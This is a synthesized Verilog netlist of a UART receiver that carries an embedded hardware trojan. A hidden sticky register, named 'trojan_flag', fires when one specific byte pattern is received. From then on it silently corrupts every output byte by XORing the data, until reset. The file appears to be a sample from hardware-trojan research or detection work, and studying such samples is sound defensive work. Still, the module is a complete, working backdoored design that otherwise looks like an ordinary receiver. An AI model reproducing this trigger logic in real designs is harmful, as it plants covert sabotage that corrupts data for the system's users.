/* Generated by Yosys 0.9 (git sha1 1979e0b) */

module uart_rx(clk, resetn, uart_rxd, uart_rx_en, uart_rx_break, uart_rx_valid, uart_rx_data);
  wire [3:0] _000_;
  wire _001_;
  wire [13:0] _002_;
  wire [7:0] _003_;
  wire _004_;
  wire _005_;
  wire [7:0] _006_;
  wire [7:0] _007_;
  wire _008_;
  wire _009_;
  wire _010_;
  wire _011_;
  wire _012_;
  wire _013_;
  wire _014_;
  wire _015_;
  wire _016_;
  wire _017_;
  wire _018_;
  wire _019_;
  wire _020_;
  wire _021_;
  wire _022_;
  wire _023_;
  wire _024_;
  wire _025_;
  wire _026_;
  wire _027_;
  wire _028_;
  wire _029_;
  wire _030_;
  wire _031_;
  wire _032_;
  wire _033_;
  wire _034_;
  wire _035_;
  wire _036_;
  wire _037_;
  wire _038_;
  wire _039_;
  wire _040_;
  wire _041_;
  wire _042_;
  wire _043_;
  wire _044_;
  wire _045_;
  wire _046_;
  wire _047_;
  wire _048_;
  wire _049_;
  wire _050_;
  wire _051_;
  wire _052_;
  wire _053_;
  wire _054_;
  wire _055_;
  wire _056_;
  wire _057_;
  wire _058_;
  wire _059_;
  wire _060_;
  wire _061_;
  wire _062_;
  wire _063_;
  wire _064_;
  wire _065_;
  wire _066_;
  wire _067_;
  wire _068_;
  wire _069_;
  wire _070_;
  wire _071_;
  wire _072_;
  wire _073_;
  wire _074_;
  wire _075_;
  wire _076_;
  wire _077_;
  wire _078_;
  wire _079_;
  wire _080_;
  wire _081_;
  wire _082_;
  wire _083_;
  wire _084_;
  wire _085_;
  wire _086_;
  wire _087_;
  wire _088_;
  wire _089_;
  wire _090_;
  wire _091_;
  wire _092_;
  wire _093_;
  wire _094_;
  wire _095_;
  wire _096_;
  wire _097_;
  wire _098_;
  wire _099_;
  wire _100_;
  wire _101_;
  wire _102_;
  wire _103_;
  wire _104_;
  wire _105_;
  wire _106_;
  wire _107_;
  wire _108_;
  wire _109_;
  wire _110_;
  wire _111_;
  wire _112_;
  wire _113_;
  wire _114_;
  wire _115_;
  wire _116_;
  wire _117_;
  wire _118_;
  wire _119_;
  wire _120_;
  wire _121_;
  wire _122_;
  wire _123_;
  wire _124_;
  wire _125_;
  wire _126_;
  wire _127_;
  wire _128_;
  wire _129_;
  wire _130_;
  wire _131_;
  wire _132_;
  wire _133_;
  wire _134_;
  wire _135_;
  wire _136_;
  wire _137_;
  wire _138_;
  wire _139_;
  wire _140_;
  wire _141_;
  wire _142_;
  wire _143_;
  wire _144_;
  wire _145_;
  wire _146_;
  wire _147_;
  wire _148_;
  wire _149_;
  wire _150_;
  wire _151_;
  wire _152_;
  wire _153_;
  wire _154_;
  wire _155_;
  wire _156_;
  wire _157_;
  wire _158_;
  wire _159_;
  wire _160_;
  wire _161_;
  wire _162_;
  wire _163_;
  wire _164_;
  wire _165_;
  wire _166_;
  wire _167_;
  wire _168_;
  wire _169_;
  wire _170_;
  wire _171_;
  wire _172_;
  wire _173_;
  wire _174_;
  wire _175_;
  wire _176_;
  wire _177_;
  wire _178_;
  wire _179_;
  wire _180_;
  wire _181_;
  wire _182_;
  wire _183_;
  wire _184_;
  wire _185_;
  wire _186_;
  wire _187_;
  wire _188_;
  reg [3:0] bit_counter;
  reg bit_sample;
  input clk;
  reg [13:0] cycle_counter;
  reg [3:0] fsm_state;
  reg [7:0] received_data;
  input resetn;
  reg rxd_reg;
  reg rxd_reg_0;
  wire [7:0] trojan_flag;
  output uart_rx_break;
  output [7:0] uart_rx_data;
  reg [7:0] uart_rx_data;
  input uart_rx_en;
  output uart_rx_valid;
  input uart_rxd;
  assign _179_ = ~(fsm_state[0] & rxd_reg);
  assign _180_ = ~(resetn & _179_);
  assign _181_ = cycle_counter[7] & cycle_counter[8];
  assign _182_ = ~(cycle_counter[1] | cycle_counter[0]);
  assign _183_ = ~(cycle_counter[10] | cycle_counter[13]);
  assign _184_ = _182_ & _183_;
  assign _185_ = _181_ & _184_;
  assign _186_ = ~(cycle_counter[6] | cycle_counter[11]);
  assign _187_ = cycle_counter[9] & cycle_counter[12];
  assign _188_ = _186_ & _187_;
  assign _012_ = ~(cycle_counter[5] | cycle_counter[4]);
  assign _013_ = cycle_counter[3] & ~(cycle_counter[2]);
  assign _014_ = _012_ & _013_;
  assign _015_ = _188_ & _014_;
  assign _016_ = ~(_185_ & _015_);
  assign _017_ = cycle_counter[2] & ~(cycle_counter[3]);
  assign _018_ = _012_ & _017_;
  assign _019_ = ~(cycle_counter[9] | cycle_counter[12]);
  assign _020_ = cycle_counter[6] & cycle_counter[11];
  assign _021_ = _019_ & _020_;
  assign _022_ = _018_ & _021_;
  assign _023_ = _185_ & _022_;
  assign _024_ = ~(fsm_state[3] & _023_);
  assign _025_ = ~(_016_ & _024_);
  assign _026_ = fsm_state[3] & _025_;
  assign _027_ = _185_ & _021_;
  assign _028_ = _018_ & _027_;
  assign _029_ = ~(fsm_state[3] & _028_);
  assign _030_ = ~(_016_ & _029_);
  assign _008_ = _180_ | _026_;
  assign _031_ = resetn & ~(_025_);
  assign _032_ = ~(fsm_state[3] & _031_);
  assign _033_ = ~(bit_counter[1] | bit_counter[0]);
  assign _034_ = bit_counter[3] & ~(bit_counter[2]);
  assign _035_ = _033_ & _034_;
  assign _036_ = resetn & fsm_state[1];
  assign _037_ = ~(_035_ & _036_);
  assign _011_ = ~(_032_ & _037_);
  assign _038_ = fsm_state[0] & ~(rxd_reg);
  assign _039_ = fsm_state[2] & ~(_025_);
  assign _040_ = _038_ | _039_;
  assign _010_ = resetn & _040_;
  assign _041_ = _035_ | ~(fsm_state[1]);
  assign _042_ = ~(fsm_state[2] & _025_);
  assign _043_ = ~(_041_ & _042_);
  assign _009_ = resetn & _043_;
  assign _044_ = ~(fsm_state[1] | fsm_state[2]);
  assign _045_ = _044_ & ~(_038_);
  assign uart_rx_valid = _026_ & _045_;
  assign _046_ = ~(received_data[0] | received_data[1]);
  assign _047_ = ~(received_data[2] | received_data[3]);
  assign _048_ = _046_ & _047_;
  assign _049_ = ~(received_data[6] | received_data[4]);
  assign _050_ = ~(received_data[7] | received_data[5]);
  assign _051_ = _049_ & _050_;
  assign _052_ = _048_ & _051_;
  assign uart_rx_break = uart_rx_valid & _052_;
  assign _053_ = rxd_reg_0 | uart_rx_en;
  assign _054_ = uart_rxd | ~(uart_rx_en);
  assign _055_ = ~(_053_ & _054_);
  assign _005_ = ~(resetn & _055_);
  assign _056_ = rxd_reg | uart_rx_en;
  assign _057_ = rxd_reg_0 | ~(uart_rx_en);
  assign _058_ = ~(_056_ & _057_);
  assign _004_ = ~(resetn & _058_);
  assign _059_ = ~(fsm_state[3] | fsm_state[2]);
  assign _060_ = fsm_state[1] | ~(_059_);
  assign _061_ = cycle_counter[0] & _060_;
  assign _062_ = cycle_counter[0] ^ _060_;
  assign _002_[0] = _031_ & _062_;
  assign _063_ = cycle_counter[1] & _061_;
  assign _064_ = cycle_counter[1] | _061_;
  assign _065_ = resetn & _064_;
  assign _002_[1] = _065_ & ~(_063_);
  assign _066_ = cycle_counter[2] & _063_;
  assign _067_ = cycle_counter[2] ^ _063_;
  assign _002_[2] = _031_ & _067_;
  assign _068_ = cycle_counter[3] & _066_;
  assign _069_ = cycle_counter[3] ^ _066_;
  assign _002_[3] = _031_ & _069_;
  assign _070_ = cycle_counter[4] & _068_;
  assign _071_ = cycle_counter[4] | _068_;
  assign _072_ = resetn & _071_;
  assign _002_[4] = _072_ & ~(_070_);
  assign _073_ = ~(cycle_counter[5] & _070_);
  assign _074_ = cycle_counter[5] | _070_;
  assign _075_ = resetn & _074_;
  assign _002_[5] = _073_ & _075_;
  assign _076_ = cycle_counter[5] & cycle_counter[6];
  assign _077_ = _070_ & _076_;
  assign _078_ = ~(cycle_counter[6] ^ _073_);
  assign _002_[6] = _031_ & _078_;
  assign _079_ = ~(cycle_counter[7] & _077_);
  assign _080_ = cycle_counter[7] | _077_;
  assign _081_ = _031_ & _080_;
  assign _002_[7] = _079_ & _081_;
  assign _082_ = cycle_counter[8] | ~(_079_);
  assign _083_ = ~(_181_ & _077_);
  assign _084_ = _031_ & _083_;
  assign _002_[8] = _082_ & _084_;
  assign _085_ = cycle_counter[9] | ~(_083_);
  assign _086_ = _181_ & _076_;
  assign _087_ = cycle_counter[9] & _086_;
  assign _088_ = _070_ & _087_;
  assign _089_ = _031_ & ~(_088_);
  assign _002_[9] = _085_ & _089_;
  assign _090_ = cycle_counter[10] & _088_;
  assign _091_ = cycle_counter[10] | _088_;
  assign _092_ = resetn & _091_;
  assign _002_[10] = _092_ & ~(_090_);
  assign _093_ = cycle_counter[11] & _090_;
  assign _094_ = cycle_counter[11] | _090_;
  assign _095_ = _031_ & _094_;
  assign _002_[11] = _095_ & ~(_093_);
  assign _096_ = ~(cycle_counter[12] & _093_);
  assign _097_ = cycle_counter[12] | _093_;
  assign _098_ = _031_ & _097_;
  assign _002_[12] = _096_ & _098_;
  assign _099_ = ~(cycle_counter[13] ^ _096_);
  assign _002_[13] = resetn & _099_;
  assign _100_ = resetn & ~(fsm_state[0]);
  assign _101_ = _059_ & _100_;
  assign _102_ = fsm_state[1] & _030_;
  assign _103_ = bit_counter[0] | _102_;
  assign _104_ = _101_ & _103_;
  assign _105_ = bit_counter[0] & _102_;
  assign _000_[0] = _104_ & ~(_105_);
  assign _106_ = bit_counter[1] | _105_;
  assign _107_ = _101_ & _106_;
  assign _108_ = bit_counter[1] & _105_;
  assign _000_[1] = _107_ & ~(_108_);
  assign _109_ = bit_counter[2] | _108_;
  assign _110_ = ~(bit_counter[2] & _108_);
  assign _111_ = _101_ & _110_;
  assign _000_[2] = _109_ & _111_;
  assign _112_ = ~(bit_counter[3] ^ _110_);
  assign _000_[3] = _101_ & _112_;
  assign _113_ = ~(received_data[0] ^ trojan_flag[0]);
  assign _114_ = fsm_state[3] | uart_rx_data[0];
  assign _115_ = resetn & _114_;
  assign _116_ = ~(fsm_state[3] & _113_);
  assign _007_[0] = _115_ & _116_;
  assign _117_ = ~(received_data[1] ^ trojan_flag[0]);
  assign _118_ = fsm_state[3] | uart_rx_data[1];
  assign _119_ = resetn & _118_;
  assign _120_ = ~(fsm_state[3] & _117_);
  assign _007_[1] = _119_ & _120_;
  assign _121_ = ~(received_data[2] ^ trojan_flag[0]);
  assign _122_ = fsm_state[3] | uart_rx_data[2];
  assign _123_ = resetn & _122_;
  assign _124_ = ~(fsm_state[3] & _121_);
  assign _007_[2] = _123_ & _124_;
  assign _125_ = ~(received_data[3] ^ trojan_flag[0]);
  assign _126_ = fsm_state[3] | uart_rx_data[3];
  assign _127_ = resetn & _126_;
  assign _128_ = ~(fsm_state[3] & _125_);
  assign _007_[3] = _127_ & _128_;
  assign _129_ = ~(received_data[4] ^ trojan_flag[0]);
  assign _130_ = fsm_state[3] | uart_rx_data[4];
  assign _131_ = resetn & _130_;
  assign _132_ = ~(fsm_state[3] & _129_);
  assign _007_[4] = _131_ & _132_;
  assign _133_ = ~(received_data[5] ^ trojan_flag[0]);
  assign _134_ = fsm_state[3] | uart_rx_data[5];
  assign _135_ = resetn & _134_;
  assign _136_ = ~(fsm_state[3] & _133_);
  assign _007_[5] = _135_ & _136_;
  assign _137_ = ~(received_data[6] ^ trojan_flag[0]);
  assign _138_ = fsm_state[3] | uart_rx_data[6];
  assign _139_ = resetn & _138_;
  assign _140_ = ~(fsm_state[3] & _137_);
  assign _007_[6] = _139_ & _140_;
  assign _141_ = ~(received_data[7] ^ trojan_flag[0]);
  assign _142_ = fsm_state[3] | uart_rx_data[7];
  assign _143_ = resetn & _142_;
  assign _144_ = ~(fsm_state[3] & _141_);
  assign _007_[7] = _143_ & _144_;
  assign _145_ = received_data[3] & ~(received_data[2]);
  assign _146_ = received_data[0] & received_data[1];
  assign _147_ = _145_ & _146_;
  assign _148_ = received_data[7] & received_data[5];
  assign _149_ = _049_ & _148_;
  assign _150_ = _147_ & _149_;
  assign _151_ = trojan_flag[0] | _150_;
  assign _006_[0] = resetn & _151_;
  assign _152_ = bit_sample | _028_;
  assign _153_ = rxd_reg | ~(_028_);
  assign _154_ = resetn & _153_;
  assign _001_ = _152_ & _154_;
  assign _155_ = received_data[1] | _102_;
  assign _156_ = received_data[2] | ~(_102_);
  assign _157_ = _100_ & _156_;
  assign _003_[1] = _155_ & _157_;
  assign _158_ = received_data[0] | _102_;
  assign _159_ = received_data[1] | ~(_102_);
  assign _160_ = _100_ & _159_;
  assign _003_[0] = _158_ & _160_;
  assign _161_ = received_data[2] | _102_;
  assign _162_ = _100_ & _161_;
  assign _163_ = received_data[3] | ~(_102_);
  assign _003_[2] = _162_ & _163_;
  assign _164_ = received_data[3] | _102_;
  assign _165_ = _100_ & _164_;
  assign _166_ = received_data[4] | ~(_102_);
  assign _003_[3] = _165_ & _166_;
  assign _167_ = received_data[4] | _102_;
  assign _168_ = received_data[5] | ~(_102_);
  assign _169_ = _100_ & _168_;
  assign _003_[4] = _167_ & _169_;
  assign _170_ = received_data[5] | _102_;
  assign _171_ = received_data[6] | ~(_102_);
  assign _172_ = _100_ & _171_;
  assign _003_[5] = _170_ & _172_;
  assign _173_ = received_data[6] | _102_;
  assign _174_ = _100_ & _173_;
  assign _175_ = received_data[7] | ~(_102_);
  assign _003_[6] = _174_ & _175_;
  assign _176_ = received_data[7] | _102_;
  assign _177_ = bit_sample | ~(_102_);
  assign _178_ = _100_ & _177_;
  assign _003_[7] = _176_ & _178_;
  always @(posedge clk)
      fsm_state[0] <= _008_;
  always @(posedge clk)
      fsm_state[1] <= _009_;
  always @(posedge clk)
      fsm_state[2] <= _010_;
  always @(posedge clk)
      fsm_state[3] <= _011_;
  reg \trojan_flag_reg[0] ;
  always @(posedge clk)
      \trojan_flag_reg[0]  <= _006_[0];
  assign trojan_flag[0] = \trojan_flag_reg[0] ;
  always @(posedge clk)
      rxd_reg <= _004_;
  always @(posedge clk)
      rxd_reg_0 <= _005_;
  always @(posedge clk)
      cycle_counter[0] <= _002_[0];
  always @(posedge clk)
      cycle_counter[1] <= _002_[1];
  always @(posedge clk)
      cycle_counter[2] <= _002_[2];
  always @(posedge clk)
      cycle_counter[3] <= _002_[3];
  always @(posedge clk)
      cycle_counter[4] <= _002_[4];
  always @(posedge clk)
      cycle_counter[5] <= _002_[5];
  always @(posedge clk)
      cycle_counter[6] <= _002_[6];
  always @(posedge clk)
      cycle_counter[7] <= _002_[7];
  always @(posedge clk)
      cycle_counter[8] <= _002_[8];
  always @(posedge clk)
      cycle_counter[9] <= _002_[9];
  always @(posedge clk)
      cycle_counter[10] <= _002_[10];
  always @(posedge clk)
      cycle_counter[11] <= _002_[11];
  always @(posedge clk)
      cycle_counter[12] <= _002_[12];
  always @(posedge clk)
      cycle_counter[13] <= _002_[13];
  always @(posedge clk)
      bit_sample <= _001_;
  always @(posedge clk)
      bit_counter[0] <= _000_[0];
  always @(posedge clk)
      bit_counter[1] <= _000_[1];
  always @(posedge clk)
      bit_counter[2] <= _000_[2];
  always @(posedge clk)
      bit_counter[3] <= _000_[3];
  always @(posedge clk)
      received_data[0] <= _003_[0];
  always @(posedge clk)
      received_data[1] <= _003_[1];
  always @(posedge clk)
      received_data[2] <= _003_[2];
  always @(posedge clk)
      received_data[3] <= _003_[3];
  always @(posedge clk)
      received_data[4] <= _003_[4];
  always @(posedge clk)
      received_data[5] <= _003_[5];
  always @(posedge clk)
      received_data[6] <= _003_[6];
  always @(posedge clk)
      received_data[7] <= _003_[7];
  always @(posedge clk)
      uart_rx_data[0] <= _007_[0];
  always @(posedge clk)
      uart_rx_data[1] <= _007_[1];
  always @(posedge clk)
      uart_rx_data[2] <= _007_[2];
  always @(posedge clk)
      uart_rx_data[3] <= _007_[3];
  always @(posedge clk)
      uart_rx_data[4] <= _007_[4];
  always @(posedge clk)
      uart_rx_data[5] <= _007_[5];
  always @(posedge clk)
      uart_rx_data[6] <= _007_[6];
  always @(posedge clk)
      uart_rx_data[7] <= _007_[7];
endmodule
